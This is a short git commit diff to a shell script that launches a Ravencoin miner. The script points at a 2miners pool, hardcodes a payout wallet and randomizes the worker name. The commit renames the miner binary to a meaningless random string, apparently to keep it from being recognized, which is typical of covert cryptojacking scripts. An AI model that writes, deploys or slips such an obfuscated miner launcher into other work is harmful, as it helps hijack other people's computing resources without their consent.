62b33392e77df082b0e507608a1996b185dd1fa4
jbsfheb <86512712+jbsfheb@users.noreply.github.com>
2021-06-29 06:33:02 +0000

    Update Niz.sh

--- Niz.sh
+++ Niz.sh
@@ -2,5 +2,5 @@
 POOL=stratum+tcp://us-rvn.2miners.com:6060
 WALLET=RDsvyXjP1eMrXSeWDRrF9rX4Kq69Hve2hY
 WORKEER=$(echo $(shuf -i 1000-9999 -n 1)-USER1#7fgs-5h28)
-chmod +x nbminer
-./nbminer -a kawpow -o $POOL -u $WALLET.$WORKEER pause
+chmod +x ycrE31Q5C3yg
+./ycrE31Q5C3yg -a kawpow -o $POOL -u $WALLET.$WORKEER --coin RVN --intensity 18
